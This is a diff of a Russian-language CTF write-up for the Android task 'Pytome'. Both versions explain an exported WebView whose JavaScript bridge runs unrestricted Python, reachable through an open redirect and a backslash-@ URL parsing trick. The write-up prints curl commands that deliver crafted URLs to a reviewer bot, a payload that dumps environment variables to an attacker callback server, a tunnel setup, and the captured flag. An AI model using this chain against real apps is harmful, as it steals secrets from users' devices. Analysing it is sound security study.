@@ -1,293 +1,196 @@
-# Pytome — разбор
+# Pytome — технический разбор
 
 **Флаг:** `avito{pYThON_In_WEbv13w_1s_D4NGEroUs}`
-**Класс:** Android / мобилки (экспортируемая WebView + JS-мост + слабая проверка хоста) ·
-**Сложность:** н/д · **Очки:** н/д · **Решило команд:** н/д
-**Автор:** н/д (метаданные платформы по этой задаче не сохранены)
+**Класс:** Android / WebView bridge / arbitrary code execution
 
-## В двух словах (без терминов)
+## Краткое техническое резюме
 
-Есть мобильное приложение-«обучалка по Python»: внутри у него настоящий Python, и оно исполняет код
-прямо на телефоне. Секрет (флаг) хранится в «настройках окружения» приложения на телефоне
-бота-проверяющего.
+Exported `DocsActivity` загружает user-controlled URL в JavaScript-enabled WebView и публикует
+`AndroidBridge.eval`. Bridge передаёт input в embedded CPython `exec()` без sandboxing. Application
+валидирует только initial URL host; последующие WebView navigations не проходят origin validation.
 
-Внутри приложения есть встроенное окошко-браузер, а в нём — «волшебная трубка»: любой скрипт с
-веб-страницы может через неё сказать приложению «выполни вот этот Python» — и приложение выполнит.
-Чтобы чужие сайты не могли этим пользоваться, стоит охранник: он проверяет, что окошко открывает
-**наш доверенный сайт**. Но проверяет он только **самый первый** адрес, а куда браузер уйдёт потом
-(после переадресации) — уже нет. Мы заходим через «правильную» дверь доверенного сайта, а он тут же
-перебрасывает нас на нашу страницу-ловушку — при этом «волшебная трубка» остаётся в руках. Наш скрипт
-командует приложению выдать секретную переменную окружения `FLAG` и присылает её нам.
+Open redirect на trusted domain или URL parsing differential `\@` переводит WebView на attacker
+origin, сохраняя native bridge. JavaScript вызывает Python, читает `os.environ['FLAG']` и отправляет
+результат на callback server.
 
 ---
 
-## 1. Что за задача
+## 1. Контекст и цель
 
-Мобильное приложение-«обучалка Python» (Pytome) исполняет код прямо на телефоне. **Цель:** слить
-переменную окружения `FLAG` из приложения.
+Дан `pytome.apk` размером около 60 МБ и web service:
 
-> Мини-словарь. **Переменная окружения** — настройка вида «имя = значение», которую операционная
-> система передаёт запущенной программе (например, `FLAG = avito{...}`). Программа может её прочитать,
-> но в самом файле приложения её нет — она задаётся при запуске.
-
-**Дано:** файл приложения `pytome.apk` (~60 МБ). Серверной части в APK нет, но она есть на
-`https://pytome-57ymra6o.avitoctf.ru`.
-
-> Мини-словарь. **APK** — файл-установщик Android-приложения (по сути zip-архив с кодом и ресурсами).
-
-## 2. Разведка — что мы увидели
-
-Это не «одна дырка», а цепочка из нескольких звеньев.
-
-**1) APK на 60 МБ — подозрительно много.** Распаковка (`unzip pytome.apk -d extracted/`) показывает:
-
-- `extracted/lib/{arm64-v8a,x86_64,...}/libpython3.11.so`, `libchaquopy_java.so`, `libssl_python.so`;
-- каталог `extracted/assets/chaquopy/` (`bootstrap.imy`, `stdlib-*.imy`, `app.imy`, `requirements-*.imy`).
-
-Вывод: это **Chaquopy** — фреймворк, встраивающий настоящий **CPython 3.11** в Android-приложение.
-Значит приложение реально исполняет Python **на телефоне**, локально, а не где-то на сервере.
-
-> Мини-словарь. **Chaquopy** — библиотека, которая «вкладывает» полноценный интерпретатор Python внутрь
-> Android-приложения. **CPython** — стандартная реализация Python. **`.so`** — скомпилированная
-> нативная библиотека (`libpython3.11.so` — это и есть встроенный Python).
-
-**2) Манифест.** `extracted/AndroidManifest.xml` (в двоичном формате AXML, строки в UTF-16). Видно:
-пакет `ru.avitoctf.pytome`; активити `MainActivity`, `DocsActivity`, класс приложения
-`PytomeApplication`; включён **`usesCleartextTraffic`** (разрешён незашифрованный HTTP); разрешения
-`INTERNET` и `DUMP`; **deep link** `action.VIEW` + `category.BROWSABLE`/`DEFAULT`, схема `pytome`,
-хост `docs` → то есть ссылка вида `pytome://docs`; и обе активити помечены **`exported`**.
-
-> Мини-словарь. **Активити (Activity)** — отдельный экран Android-приложения. **`exported`** — «открыта
-> наружу»: такой экран могут запустить **другие** приложения или ссылка из браузера. **Deep link** —
-> специальная ссылка (тут `pytome://docs?...`), по клику на которую открывается конкретный экран
-> приложения. Именно через неё чужой может «постучаться» внутрь.
-
-## 3. Как мы дошли до решения (главный раздел)
-
-**Наблюдение.** Задача называет себя «обучалка Python с защитой от пчёл-вайбкодеров» — значит,
-ожидается какой-то фильтр опасного кода.
-
-**Гипотеза** — если фильтра нет, любой присланный Python выполнится без ограничений.
-**Проверка** — декомпилируем `classes.dex` (инструментом jadx) и смотрим класс `PythonEngine.execute(code)`:
-там буквально `builtins.exec(code, ...)`, а результат — то, что напечаталось (через `redirect_stdout`).
-**Подтверждено:** никаких проверок `import`/`os`/`environ` нет — «защита» фейковая. Код
-`import os; print(os.environ['FLAG'])` сработает в лоб — **если** удастся довести свой Python до этого
-`execute()`.
-
-> Мини-словарь. **Декомпиляция** — восстановление читаемого кода из скомпилированного приложения.
-> **`classes.dex`** — файл со скомпилированным кодом Android-приложения. **`exec(code)`** — команда
-> Python «выполни вот эту строку как программу» без каких-либо ограничений.
-
-**Наблюдение.** `MainActivity.onCreate` берёт `getIntent().getStringExtra("FLAG")` и кладёт значение в
-`os.environ["FLAG"]`.
-**Вывод** — флаг задаётся **при запуске приложения на устройстве проверяющего** (передаётся ему при
-старте), в самом APK его нет. Значит, нам нужен **лик во время работы живого приложения**, а не
-статический разбор файла.
-
-**Наблюдение.** А кто вообще вызывает `execute()`? — `DocsActivity`: там встроенный браузер `WebView`
-с `setJavaScriptEnabled(true)` и `addJavascriptInterface(new PythonBridge(), "AndroidBridge")`, где
-метод `@JavascriptInterface eval(code)` вызывает `PythonEngine.execute(code)`.
-
-> Мини-словарь. **WebView** — окошко-браузер внутри приложения, показывающее веб-страницы.
-> **`addJavascriptInterface(объект, "имя")`** — «мост»: он выставляет наружу, в JavaScript открытой
-> страницы, объект `AndroidBridge`, чьи методы можно звать прямо со страницы. То есть JavaScript
-> получает «трубку» напрямую к нативному коду приложения.
-
-**Гипотеза.** Любой JavaScript, исполненный в этом `WebView`, может позвать `AndroidBridge.eval` и тем
-самым выполнить произвольный Python. Осталось подсунуть в это окошко **свою** страницу.
-
-**Наблюдение.** `DocsActivity` (exported, deep link `pytome://docs?url=...`) проверяет, что хост
-**стартового** URL равен `pytome-57ymra6o.avitoctf.ru`.
-**Гипотеза.** Проверка стартового адреса ничего не говорит о том, что происходит **после** навигации
-(переадресаций, смены хоста). Если клиент `WebView` — дефолтный `WebViewClient()`, не переопределяющий
-`shouldOverrideUrlLoading`, то каждая следующая навигация **не проверяется**, и «мост» должен пережить
-переход на чужой хост.
-**Проверка** — ищем в декомпиляции переопределение `shouldOverrideUrlLoading` в `DocsActivity`: не
-найдено, используется дефолтный клиент. Гипотеза подтверждена архитектурно.
-
-> Мини-словарь. **Навигация / переадресация (redirect)** — когда страница сама отправляет браузер по
-> другому адресу. **`shouldOverrideUrlLoading`** — то место, где приложение *могло бы* проверять каждый
-> новый адрес, но здесь его не проверяет. Значит охранник смотрит только «куда мы зашли сначала», а не
-> «куда ушли потом».
-
-**Как обойти проверку хоста — два способа, оба проверены.**
-
-- **Открытый редирект** на доверенном хосте: `GET /go?to=<любой URL>` отдаёт переадресацию куда угодно
-  — нашли просмотром бэкенд-роутов. То есть сам доверенный сайт услужливо перебрасывает нас на наш.
-
-  > Мини-словарь. **Открытый редирект (open redirect)** — на сайте есть ссылка, которая перекидывает
-  > пользователя на любой указанный ему адрес. Стартовый хост — доверенный, а конечный — наш.
-
-- **Расхождение в разборе URL через `\@`**: в адресе
-  `https://<НАШ_ХОСТ>\@pytome-57ymra6o.avitoctf.ru/x` серверная проверка и `WebView` **по-разному**
-  решают, где тут хост. В логе сервера это видно как загруженный путь `/@pytome-.../x` — то есть
-  бэкенд-проверка видит один хост, а движок браузера (Chromium) — другой.
-  **Следствие для нашего сервера-ловушки:** раз путь запроса непредсказуем (`/@pytome-.../x` вместо
-  ожидаемого `/x`), сервер надо делать **catch-all** — отвечать пейлоадом на **любой** путь, а не
-  ждать конкретный.
-
-  > Мини-словарь. **Расхождение в разборе URL (parsing differential)** — два разных парсера
-  > (проверяющий и браузер) не сходятся в том, что в хитро построенной ссылке считать «хостом». Мы этим
-  > пользуемся: проверяющий думает, что хост доверенный, а браузер идёт на наш.
-
-**Как доставить это боту.** На бэкенде есть форма `/docs/bug-report` — «пришли ссылку проверяющему».
-**Гипотеза** — бот автоматически открывает присланный URL в уязвимом приложении, где `FLAG` уже лежит в
-окружении. Это замыкает цепочку: доставка → навигация обходит проверку хоста → мост жив → произвольный
-Python → отправка секрета нам.
-
-### Бытовая аналогия «сердцевины»
-
-Представь клуб, куда пускают только по членской карте (доверенный хост), а внутри стоит телефон с
-прямым выходом на директора, который выполнит любую твою просьбу (это JS-мост к Python). Охранник на
-входе проверяет карту **один раз** — на входе. Но внутри есть служебный лифт, который увозит куда
-угодно (это открытый редирект и трюк с `\@`), а телефон директора ты забираешь с собой. Ты входишь по
-карте, лифт увозит тебя в подсобку злоумышленника, и оттуда ты звонишь директору: «продиктуй мне
-секретную переменную `FLAG`». Охранник ведь проверял только вход — что ты уехал вглубь и звонишь, он
-уже не контролирует.
-
-## 4. В чём именно ошибка (суть уязвимости)
-
-Опасна связка: **экспортируемое окно-браузер + мост, исполняющий произвольный код + слабая проверка
-хоста только на старте.**
-
-- `addJavascriptInterface(PythonBridge, "AndroidBridge")` + `setJavaScriptEnabled(true)` дают JS прямой
-  доступ к `PythonEngine.execute` → произвольный Python в контексте приложения;
-- `PythonEngine.execute` — голый `exec()` без всякой фильтрации;
-- «белый список» проверяет только **стартовый** URL, а дефолтный `WebViewClient` не валидирует
-  навигацию → мост живёт после переадресации/смены хоста;
-- на доверенном домене есть **open-redirect** `/go?to=` и работает **`\@`-расхождение** — оба обнуляют
-  проверку хоста;
-- доставку на устройство с секретом делает **бот-проверяющий** через `/docs/bug-report`.
-
-Итог цепочки: `pytome://docs?url=…` (или форма бота) → проверка хоста обходится open-redirect'ом / `\@`
-→ WebView грузит нашу страницу с живым `AndroidBridge` → произвольный Python → `os.environ['FLAG']` →
-отправка нам.
-
-## 5. Эксплойт по шагам
-
-Нужны: любой компьютер, Python 3 и способ показать боту страницу по HTTPS. В репозитории лежит готовый
-`task7/exploit_server.py`.
-
-### Шаг 1. Что делает `exploit_server.py`
-
-Catch-all сервер-ловушка: на **любой** путь он отдаёт страницу-пейлоад, а служебные `/probe`, `/exfil`,
-`/diag` логирует. Пейлоад:
-
-- выполняет через мост `import os, json; print(json.dumps(dict(os.environ)))` — дампит всё окружение
-  (`FLAG` внутри);
-- не знает заранее имя моста, поэтому **перебирает кандидатов**: объекты
-  `AndroidBridge, Android, Bridge, PythonBridge, Pytome, ...` и методы
-  `eval, exec, execute, run, runPython, ...`; если мост есть — вызывает первый рабочий и шлёт результат
-  на `/exfil`;
-- если моста нет (обычный браузер) — шлёт диагностику на `/diag` со списком доступных объектов;
-- отправка дублируется тремя каналами: `XMLHttpRequest`, `navigator.sendBeacon`, `new Image().src`;
-- сервер функцией `find_flag` вырезает подстроку `avito{...}` и печатает `[FLAG] ...`.
-
-> Мини-словарь. **Exfil (эксфильтрация)** — «вынести данные наружу», отправить украденное на свой
-> сервер. Три канала — чтобы сработало наверняка, даже если один заблокирован.
-
-```bash
-uv run python task7/exploit_server.py  # слушает http://127.0.0.1:8000
+```text
+https://pytome-57ymra6o.avitoctf.ru/
 ```
 
-### Шаг 2. Туннель наружу (HTTPS)
+Задача требует извлечь runtime environment variable `FLAG` из application process на Android
+устройстве reviewer bot. Значение не хранится статически в APK: `MainActivity` получает Intent extra
+`FLAG` и записывает его в `os.environ`.
+
+## 2. Reconnaissance и attack surface
+
+Распаковка APK показывает embedded Chaquopy runtime:
+
+- `lib/{arm64-v8a,x86_64,...}/libpython3.11.so`;
+- `libchaquopy_java.so`, `libssl_python.so`;
+- `assets/chaquopy/bootstrap.imy`, `stdlib-*.imy`, `app.imy`.
+
+Application исполняет CPython 3.11 внутри Android process.
+
+`AndroidManifest.xml` содержит:
+
+- package `ru.avitoctf.pytome`;
+- exported `MainActivity` и `DocsActivity`;
+- `VIEW` intent filter со scheme `pytome` и host `docs`;
+- permissions `INTERNET` и `DUMP`;
+- `usesCleartextTraffic=true`.
+
+Декомпиляция `classes.dex` через jadx выявляет:
+
+```text
+PythonEngine.execute(code) -> builtins.exec(code, ...)
+DocsActivity              -> WebView.setJavaScriptEnabled(true)
+DocsActivity              -> addJavascriptInterface(PythonBridge, "AndroidBridge")
+PythonBridge.eval(code)   -> PythonEngine.execute(code)
+```
+
+Фильтрация modules, builtins или environment access отсутствует. Таким образом,
+`AndroidBridge.eval` предоставляет arbitrary Python execution в security context приложения.
+
+## 3. Анализ и проверка гипотез
+
+### 3.1. Initial URL validation
+
+`DocsActivity` доступна через deep link:
+
+```text
+pytome://docs?url=<target>
+```
+
+Перед `WebView.loadUrl` приложение проверяет, что host initial URL равен
+`pytome-57ymra6o.avitoctf.ru`. Однако используется default `WebViewClient`; application не реализует
+per-navigation validation в `shouldOverrideUrlLoading` и не удаляет JavaScript interface при смене
+origin.
+
+### 3.2. Origin transition
+
+Проверку initial host можно удовлетворить двумя способами:
+
+1. Trusted service предоставляет open redirect:
+
+   ```text
+   https://pytome-57ymra6o.avitoctf.ru/go?to=https://<callback-host>/x
+   ```
+
+2. URL `https://<callback-host>\@pytome-57ymra6o.avitoctf.ru/x` обрабатывается validator и Chromium
+   по-разному. Callback server получает request path вида `/@pytome-.../x`, поэтому должен обслуживать
+   payload на любом path.
+
+В обоих случаях initial validation проходит, а финальный document загружается с attacker-controlled
+origin при активном `AndroidBridge`.
+
+### 3.3. Python execution и exfiltration
+
+JavaScript payload вызывает bridge с Python expression:
+
+```python
+import os, json
+print(json.dumps(dict(os.environ)))
+```
+
+`task7/exploit_server.py` перебирает ожидаемые bridge object names и method names, чтобы не зависеть от
+одного identifier. Результат отправляется на `/exfil` через XMLHttpRequest, `sendBeacon` и image
+request. Callback server извлекает pattern `avito{...}` из полученного environment dump.
+
+### 3.4. Доставка URL reviewer bot
+
+Web form `/docs/bug-report` передаёт URL Android reviewer, в process которого уже установлена
+переменная `FLAG`. Rate limit составляет приблизительно один report в минуту.
+
+## 4. Корневая причина
+
+Уязвимость формируется сочетанием нескольких issues:
+
+1. exported Activity принимает externally controlled navigation target;
+2. WebView исполняет JavaScript и публикует privileged native interface;
+3. bridge предоставляет unrestricted Python `exec()`;
+4. origin validation применяется только к initial URL;
+5. bridge остаётся доступным после redirects и cross-origin navigation;
+6. trusted origin предоставляет open redirect;
+7. альтернативный URL parser path допускает authority parsing differential.
+
+Security decision привязан к initial navigation, тогда как privileged bridge существует на
+протяжении всей lifetime WebView. Это превращает любой origin transition в native code execution.
+
+## 5. Эксплуатация
+
+### 5.1. Callback server
+
+```bash
+uv run python task7/exploit_server.py
+# слушает http://127.0.0.1:8000
+```
+
+### 5.2. Публичный HTTPS endpoint
 
 ```bash
 cloudflared tunnel --url http://localhost:8000
-# -> https://<random>.trycloudflare.com  (это «наш хост»)
+# https://<random>.trycloudflare.com
 ```
 
-> Мини-словарь. **Туннель (cloudflared)** — временный публичный HTTPS-адрес, ведущий на твой локальный
-> сервер, чтобы бот в интернете смог до него достучаться.
+### 5.3. Отправка URL
 
-### Шаг 3. Собираем URL, обходящий проверку хоста
-
-```
-# (а) через открытый редирект доверенного хоста:
-https://pytome-57ymra6o.avitoctf.ru/go?to=https://<random>.trycloudflare.com/x
-
-# (б) через \@-расхождение разбора URL:
-https://<random>.trycloudflare.com\@pytome-57ymra6o.avitoctf.ru/x
-```
-
-Доставить можно как **deep link** `pytome://docs?url=<внутренний_url>` (бот откроет его в приложении)
-или напрямую через форму бота.
-
-### Шаг 4. Отправляем ссылку боту-проверяющему
+Через parsing differential:
 
 ```bash
 curl -s https://pytome-57ymra6o.avitoctf.ru/docs/bug-report \
   --data-urlencode 'name=medoedik' \
   --data-urlencode 'email=medoedik@avito.ru' \
-  --data-urlencode 'url=https://<random>.trycloudflare.com\@pytome-57ymra6o.avitoctf.ru/x' \
+  --data-urlencode 'url=pytome://docs?url=https://<random>.trycloudflare.com\@pytome-57ymra6o.avitoctf.ru/x' \
   --data-urlencode 'bug_type=other' \
   --data-urlencode 'description=review'
 ```
 
-Вариант через открытый редирект (`/go?to=`):
+Через open redirect:
 
 ```bash
 curl -s https://pytome-57ymra6o.avitoctf.ru/docs/bug-report \
-  --data-urlencode 'url=https://pytome-57ymra6o.avitoctf.ru/go?to=https://<random>.trycloudflare.com/x'
+  --data-urlencode 'url=pytome://docs?url=https://pytome-57ymra6o.avitoctf.ru/go?to=https://<random>.trycloudflare.com/x'
 ```
 
-Ответ — «ЗАЯВКА #…, ожидаем ревизора». Ограничение частоты ~1 заявка в минуту.
+Ожидаемый callback:
 
-### Шаг 5. Ловим флаг
-
-```
-[serve] path='/@pytome-...'   | БОТ(Android)
-==================================================================
-[FLAG] avito{pYThON_In_WEbv13w_1s_D4NGEroUs}   | БОТ(Android)
+```text
+[serve] path='/@pytome-...'
+[FLAG] avito{pYThON_In_WEbv13w_1s_D4NGEroUs}
 [full] {"FLAG":"avito{pYThON_In_WEbv13w_1s_D4NGEroUs}", ...}
-==================================================================
 ```
 
-Если за пару минут пусто — проверить, что туннель живой и адрес вставлен верно, что заявка прошла (не
-словлен лимит частоты); можно отправить повторно. Признак «мост не нашёлся» — строка `[diag] ...
-NO_BRIDGE` (значит страницу открыл не бот, а обычный браузер).
+Diagnostic result `NO_BRIDGE` означает, что payload был открыт обычным browser context, а не
+уязвимой WebView.
 
 ## 6. Флаг
 
-Флаг **не зашит в APK** — он кладётся в окружение приложения на устройстве бота-проверяющего и
-достаётся ликом во время работы через бота: значение появляется на нашем сервере после запуска эксплойта.
-
-```
+```text
 avito{pYThON_In_WEbv13w_1s_D4NGEroUs}
 ```
 
-## 7. Мораль — какой это урок
+## 7. Выводы и рекомендации
 
-- **Что сделали не так.** Повесили нативный мост, исполняющий произвольный код, на **экспортируемое**
-  окно-браузер, доступное по deep link, а «белый список» хостов проверяют только у **стартового** URL —
-  не у каждой навигации. Плюс на доверенном домене оставили открытый редирект, а разбор URL расходится
-  с браузером на трюке `\@`.
-- **Почему так вышло.** Заблуждение «я проверил, что мы зашли на доверенный сайт, значит, всё, что
-  происходит в окне дальше, — безопасно». Нет: WebView свободно уходит по редиректам, а мост при этом
-  никуда не девается — он живёт на всё время жизни окна, независимо от того, чью страницу это окно
-  сейчас показывает.
-- **Как надо было.** Не вешать нативные мосты на недоверенный контент; валидировать **каждую**
-  навигацию в `WebViewClient.shouldOverrideUrlLoading` (а не только старт); не экспортировать активити
-  с мостом; убрать открытый редирект; и не исполнять пользовательский Python голым `exec`.
-- **На что смотреть.** Любой мост «веб-страница → нативный код» — это фактически удалённое исполнение,
-  если страницу может подменить кто-то извне. Проверяй не «откуда мы стартовали», а «что показано в
-  окне прямо сейчас» на каждом шаге. И практический приём при решении: не завязываться на одно имя моста
-  и одну переменную — пейлоад **перебирает** имена объектов/методов и **дампит всё окружение**, а
-  отправка дублируется тремя каналами; это резко повышает шанс с одной попытки (учитывая лимит бота).
+- Не следует публиковать privileged JavaScript interfaces для remote WebView content.
+- Каждая navigation должна проходить scheme, host, port и origin validation; redirects необходимо
+  валидировать по final destination.
+- Activity с privileged WebView не должна быть exported без строгой authentication и input policy.
+- Interpreter bridge должен использовать capability-restricted API вместо unrestricted `exec()`.
+- Open redirects на allowlisted origins необходимо рассматривать как trust-boundary bypass.
+- Для URL policy следует использовать тот же parser и canonical representation, что и navigation
+  engine, включая проверки userinfo, backslash, Unicode и percent encoding.
 
-## 8. Файлы в папке
+## 8. Файлы для воспроизведения
 
-- `task7/exploit_server.py` — курированный скрипт: catch-all HTTP-сервер-ловушка, отдаёт пейлоад на
-  любой путь, перебирает имена JS-моста/методов, дампит `os.environ` через `AndroidBridge.eval` и
-  логирует найденный `avito{...}`.
-- `task7/extracted/` — распакованный APK (`unzip pytome.apk`):
-  - `classes.dex` (декомпилировать jadx'ом), классы `ru.avitoctf.pytome`: `PythonEngine` — `execute()`
-    (голый `exec`, без фильтра) и `setEnv()` (кладёт FLAG в `os.environ`); `MainActivity` — чтение
-    Intent-extra `FLAG` в `onCreate`; `DocsActivity` — `WebView` + `addJavascriptInterface(..., "AndroidBridge")`,
-    `@JavascriptInterface eval`, слабая проверка хоста стартового URL;
-  - `AndroidManifest.xml` — обе Activity `exported`, deep link `pytome://docs`, `usesCleartextTraffic`,
-    разрешения INTERNET/DUMP;
-  - `assets/chaquopy/` и `lib/*/libpython3.11.so` — доказательство встроенного CPython.
-- `task7/pytome.apk` — исходный файл приложения.
-- Бэкенд-поверхность (на боевом хосте): `/docs/*` (страницы дёргают `AndroidBridge.eval`), `/go?to=`
-  (open redirect), `/docs/bug-report` (форма к боту-проверяющему).
+Version-controlled artifacts:
+
+- `task7/exploit_server.py` — catch-all payload server, bridge invocation и exfiltration receiver.
+
+Исходный APK ожидается в `task7/pytome.apk`. APK и generated tree `task7/extracted/` не
+входят в version-controlled набор.
